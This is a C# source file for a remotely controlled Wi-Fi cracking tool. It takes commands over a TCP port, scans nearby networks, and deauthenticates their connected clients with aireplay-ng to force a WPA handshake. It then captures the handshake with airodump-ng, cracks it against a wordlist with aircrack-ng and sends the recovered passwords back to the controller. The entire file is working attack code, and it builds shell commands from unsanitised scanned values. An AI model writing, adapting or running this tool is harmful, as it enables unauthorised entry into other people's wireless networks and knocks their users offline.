using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace jchcar
{
    public class WifiCracking
    {

        private TcpNetworking net;
        private List<Wifi> wifis;
        private Thread crackingThread;
        
        public enum WifiSec
        {
            none, WPA2,WPA,WEP
        }
        
        public class Wifi
        {
            public string ESSID,BSSID,password;
            public WifiSec wifiSec;
            public int channel;
        }
        
        public WifiCracking()
        {
            wifis = new List<Wifi>();
            net = new TcpNetworking(new IPEndPoint(IPAddress.Any, 1296),OnMessageReceive);
            
        }

        public void Start()
        {
            Console.WriteLine("Started listening for connections");
            net.Start();
        }

        public void OnMessageReceive(string message)
        {
            Console.WriteLine("got message "+message);
            string[] messageSplit = message.Split();
            
            if (message.Equals("scan"))
            {
                Scan();
            }else if (message.StartsWith("crack"))
            {
                if (messageSplit.Length == 2)
                {
                    int id = Int32.Parse(messageSplit[1]);
                    if (wifis.Count>id)
                    {
                        crackingThread?.Abort();
                        crackingThread = new Thread(() =>
                        {
                            CrackWPA2(wifis[id]); 
                        });
                        crackingThread.Start();
                        
                    }
                    else
                    {
                        net.Send("Error cracking, wifi number doesn't exist");
                    }

                }
            }else if (message.Equals("stop"))
            {
                crackingThread?.Abort();
            }
            else if (message.Equals("list"))
            {
                for (int i = 0; i < wifis.Count; i++)
                {
                    net.Send("log: "+i+","+wifis[i].BSSID+","+wifis[i].channel+","+(wifis[i].wifiSec==WifiSec.WPA2?"WPA2":"none/other")+","+wifis[i].ESSID+","+wifis[i].password);
                }
                net.Send("log: done listing wifis");
            }
        }
        

        public string GetInterfaceName()
        {
            string[] response = GetOutputLines("/bin/bash", "-c \"iw dev | grep -Eo 'wl.*'\"");
            foreach (var s in response)
            {
                Console.WriteLine(s);
                if (!s.Equals("wlan0"))
                {
                    return s;
                }
            }

            return "";
        }

        private void ManagedMode(string intfr)
        {
            if(intfr.Equals("wlan1mon"))
            RunCommand("/usr/sbin/airmon-ng", "stop "+intfr);

        }


        public string CrackWPA2(Wifi w)
        {
            RunCommand("/bin/bash", "-c \"rm /home/jc/psk*\"");
            RunCommand("/usr/sbin/airmon-ng", "start "+GetInterfaceName()+" "+w.channel);
            Process p = new Process();
            p.StartInfo.FileName = "/bin/bash";
            
            p.StartInfo.Arguments = "-c \"/usr/sbin/airodump-ng -c "+w.channel+" --bssid "+w.BSSID+" -w /home/jc/psk "+GetInterfaceName()+"\"";
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = false;
            
            p.Start();
            
            while (!p.HasExited)
            {
                Console.WriteLine("Listening for packets...");
                net.Send("log: listening for packets...");
               Thread.Sleep(5000);
               p.Kill();
               
               if (p.StandardError.ReadToEnd().Contains("WPA handshake"))
               {

                   Console.WriteLine("Got handshake");
                   net.Send("log: Got handshake");
                   net.Send("log: Cracking...");
                   string[] cracklines = GetOutputLines("/usr/bin/aircrack-ng","/home/jc/psk-01.cap -w /home/jc/wordlist.txt -l /home/jc/wifipass.txt");
                   Console.WriteLine(cracklines[5].Trim());
                   cracklines = cracklines[5].Trim().Split(' ');
                   //for (int i = 0; i < cracklines.Length;i++)
                   //{
                   //    Console.WriteLine(i+ " "+cracklines[i]);
                   //}
                   net.Send("log: ESSID "+cracklines[4]);
                   w.ESSID = cracklines[4];
                   if (File.Exists("/home/jc/wifipass.txt"))
                   {
                       StreamReader sr = new StreamReader("/home/jc/wifipass.txt");
                       string password = sr.ReadLine();
                       Console.WriteLine("password found! : "+password);
                       net.Send("log: password found! : "+password);
                       w.password = password;
                       sr.Close();
                       RunCommand("/bin/bash", "-c \"rm /home/jc/psk*\"");
                       RunCommand("/bin/bash", "-c \"rm /home/jc/wifipass.txt\"");
                       return password;

                   }
                   else
                   {
                       net.Send("log: Could not find password in wordlist");
                       Console.WriteLine("Could not find password in wordlist");
                   }
                   
                   break;
               }
               else
               {
                   
                   foreach (var mac in getMACs())
                   {
                       net.Send("Deauthing client "+mac);
                       Deauth(w,mac);
                   }
                   RunCommand("/bin/bash", "-c \"rm /home/jc/psk*\"");
                   p.Start();
               }
            }
            net.Send("log: Got handshake");
            Console.WriteLine("Ended");
            return null;
        }

        public List<string> getMACs()
        {
            List<string> macs = new List<string>();
            StreamReader sr = new StreamReader("/home/jc/psk-01.csv");
            if(!sr.EndOfStream)
            while (!sr.ReadLine().StartsWith("Station MAC") && !sr.EndOfStream)
            {
                
            }

            while (!sr.EndOfStream)
            {
                macs.Add(sr.ReadLine().Split(',')[0]);
            }
            sr.Close();
            return macs;

        }

        public void RunCommand(string file, string arguments)
        {
            Console.WriteLine("Starting command "+file+" "+arguments);
            net.Send("log: Starting command "+file+" "+arguments);
            Process p2 = new Process();
            p2.StartInfo.FileName = file;
            p2.StartInfo.Arguments = arguments;
            p2.StartInfo.UseShellExecute = false;
            p2.StartInfo.RedirectStandardOutput = true;
            p2.StartInfo.RedirectStandardError = true;
            p2.Start();
            p2.WaitForExit();
            
        }

        public string[] GetOutputLines(string file, string arguments)
        {
            Console.WriteLine("Starting command "+file+" "+arguments);
            net.Send("log: Starting command "+file+" "+arguments);
            Process p2 = new Process();
            p2.StartInfo.FileName = file;
            p2.StartInfo.Arguments = arguments;
            p2.StartInfo.RedirectStandardOutput = true;
            p2.StartInfo.RedirectStandardError = true;
            p2.StartInfo.UseShellExecute = false;
            p2.Start();
            p2.WaitForExit();
            return p2.StandardOutput.ReadToEnd().Split('\n');
        }

        public void Deauth(Wifi w, string clientMAC)
        {
            //aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
            if(clientMAC!="")
            RunCommand("/usr/sbin/aireplay-ng", "-0 1 -a "+w.BSSID+" -c "+clientMAC+" "+GetInterfaceName());
        }
        
        public void Scan()
        {
            ManagedMode(GetInterfaceName());
            wifis.Clear();
            string[] response = GetOutputLines("/sbin/iwlist", GetInterfaceName()+" scan");
            Wifi current = new Wifi();
            foreach (string s in response)
            {
                int pos = s.IndexOf("Address:", StringComparison.Ordinal);
                
                if (pos>=0)
                {
                    current.BSSID = s.Substring(pos+9);
                }
                else
                {
                    pos = s.IndexOf("Channel:", StringComparison.Ordinal);
                    if (pos>=0)
                    {
                        current.channel = Int32.Parse(s.Substring(pos+8));
                    }
                    else
                    {
                        pos = s.IndexOf("ESSID:\"", StringComparison.Ordinal);
                        if (pos>=0)
                        {
                            current.ESSID = s.Substring(pos+6);
                        }
                        else
                        {
                            pos = s.IndexOf("Encryption key:", StringComparison.Ordinal);
                            if (pos>=0)
                            {
                                if (s.Substring(pos+15).Equals("on"))
                                {
                                    current.wifiSec = WifiSec.WPA2;
                                }
                                else
                                {
                                    current.wifiSec = WifiSec.none;
                                }
                                net.Send("wifi: "+wifis.Count+" "+current.channel+" "+current.BSSID+" "+current.ESSID);
                                wifis.Add(current);
                                current = new Wifi();
                            }
                        }
                    }

                }
            }
            net.Send("log: done scanning");


        }
        
        
        
    }
}